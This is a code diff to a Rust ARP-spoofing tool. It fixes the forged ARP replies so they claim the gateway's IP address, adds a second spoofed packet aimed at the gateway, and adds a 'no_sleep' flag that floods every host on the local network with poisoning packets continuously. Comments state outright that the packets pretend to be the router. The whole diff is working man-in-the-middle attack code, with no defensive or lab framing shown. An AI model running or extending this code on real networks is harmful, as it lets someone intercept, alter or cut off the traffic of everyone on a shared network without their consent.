@@ -171,11 +171,13 @@ fn send_l2_packets() {
         let all_ips = ALL_IPS.get().filter(|x| !x.contains(&selves.0)).unwrap();
 
         loop {
-            if last_poison.elapsed() >= poison_interval {
+            if last_poison.elapsed() >= poison_interval || args.no_sleep {
                 for target_ip in all_ips {
                     send_arp_packet(&mut *tx, nf, target_ip, &gateway);
                 }
-                last_poison = Instant::now();
+                if !args.no_sleep {
+                    last_poison = Instant::now();
+                }
             }
             // to check if this spoofing is work or not
             // match rx.next() {
@@ -241,33 +243,35 @@ fn send_arp_packet(
         MacAddr::new(0, 0, 0, 0, 0, 0)
     });
 
-    let source_ip = interface
-        .ips
-        .iter()
-        .find_map(|ip_net| {
-            if let IpAddr::V4(ipv4) = ip_net.ip() {
-                Some(ipv4)
-            } else {
-                None
-            }
-        })
-        .unwrap_or_else(|| {
-            eprintln!("Interface has ipv4 address use default 192.168.1.100");
-            Ipv4Addr::new(192, 168, 1, 100)
-        });
+    // let source_ip = interface
+    //     .ips
+    //     .iter()
+    //     .find_map(|ip_net| {
+    //         if let IpAddr::V4(ipv4) = ip_net.ip() {
+    //             Some(ipv4)
+    //         } else {
+    //             None
+    //         }
+    //     })
+    //     .unwrap_or_else(|| {
+    //         eprintln!("Interface has ipv4 address use default 192.168.1.100");
+    //         Ipv4Addr::new(192, 168, 1, 100)
+    //     });
 
     let ethernet_size = EthernetPacket::minimum_packet_size();
     let arp_size = MutableArpPacket::minimum_packet_size();
     let total_size = ethernet_size + arp_size;
 
     tx.build_and_send(1, total_size, &mut |packet| {
-        build_arp_spoof(packet, source_mac, target_ip, source_ip);
+        build_arp_spoof(packet, source_mac, target_ip, *gateway_ip);
+    });
+    tx.build_and_send(1, total_size, &mut |packet| {
         build_arp_spoof_for_gateway(packet, source_mac, target_ip, gateway_ip);
     });
 }
 
 #[inline]
-fn build_arp_spoof(packet: &mut [u8], my_mac: MacAddr, target_ip: &Ipv4Addr, my_ip: Ipv4Addr) {
+fn build_arp_spoof(packet: &mut [u8], my_mac: MacAddr, target_ip: &Ipv4Addr, gateway_ip: Ipv4Addr) {
     let mut ethernet_packet = MutableEthernetPacket::new(packet).unwrap();
 
     // Send directly to the target's MAC (if known) or broadcast
@@ -286,7 +290,7 @@ fn build_arp_spoof(packet: &mut [u8], my_mac: MacAddr, target_ip: &Ipv4Addr, my_
 
     // Sender: You (claiming to be the Gateway)
     arp_packet.set_sender_hw_addr(my_mac);
-    arp_packet.set_sender_proto_addr(my_ip); // Pretending to be the router
+    arp_packet.set_sender_proto_addr(gateway_ip); // Pretending to be the router
 
     // Target: The victim device
     arp_packet.set_target_hw_addr(MacAddr::new(0, 0, 0, 0, 0, 0)); // Usually ignored in unsolicited replies
